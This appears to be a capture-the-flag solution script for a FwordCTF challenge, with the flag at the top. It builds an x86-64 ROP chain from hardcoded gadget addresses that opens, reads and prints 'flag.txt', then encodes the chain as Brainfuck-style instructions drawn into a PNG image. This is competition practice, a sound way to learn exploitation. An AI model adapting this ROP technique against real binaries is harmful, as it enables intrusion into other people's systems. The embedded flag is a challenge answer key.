#FwordCTF{Y0u_took_0v3r_thE_WorLd!_fe4f604a7fdd86e}
#Generates rop_chain
from pwn import *

pop_rax = p64(0x000000000045cd07)
pop_rdi = p64(0x00000000004018da)
pop_rsi = p64(0x0000000000402a38)
pop_rdx = p64(0x00000000004017df)
sys_ret = p64(0x0000000000426194)
ret     = p64(0x000000000040101a)
bss     = p64(0x00000000004e5360 + 224)
zero    = p64(0)

fd = 1
payload  = ""
payload += pop_rdi + bss + pop_rsi + zero + pop_rdx + p64(0) + pop_rax + p64(2) + sys_ret	#open syscall
payload += pop_rdi + p64(3) + pop_rsi + bss + pop_rdx + p64(0xff) + pop_rax + zero + sys_ret	#read from file
payload += pop_rdi + p64(fd) + pop_rsi + bss + pop_rdx + p64(0xff) + pop_rax + p64(1) + sys_ret	#write to stdout
payload += "A"*8
payload += "flag.txt\n"
rop = payload

#-------------------------------------------------------------
#Get image and arg

code  = ">"*0x78
arg   = ""

for c in rop:
	if ord(c) >= 0x21 and ord(c) < 0x7f:
		arg += c
		code += ",>"
	elif ord(c) < 0x21:
		arg += chr(0x21)
		code += ","
		code += "-"*(0x21 - ord(c))
		code += ">"
	else :
		arg += chr(0x7e)
		code += ","
		code += "+"*(ord(c) - 0x7e)
		code += ">"


#Written by @1gn1te
#-------------------------------------------------------------
from PIL import Image
import math

def code_to_image(code):
	colors = {
		'>' : (255,0,0),
		'.' : (0,255,0),
		'<' : (0,0,255),
		'+' : (255,255,0),
		'-' : (0,255,255),
		'[' : (255,0,188),
		']' : (255,128,0),
		',' : (102,0,204)
	}
	x = int(math.sqrt(len(code))) + 1
	img  = Image.new( mode = "RGB", size = (x, x) )
	pixels = img.load()
	c = 0
	try:
		for i in range(x):
			for j in range(x):
				pixels[j,i] = colors[code[c]]
				c += 1
	except:
		pass
	img.save("output.png")

code_to_image(code)
#-----------------------------------------------------------

print("Image has been saved to output.png")
print("And here is your arg:")
print(arg[:-1])
print("Enjoy :D")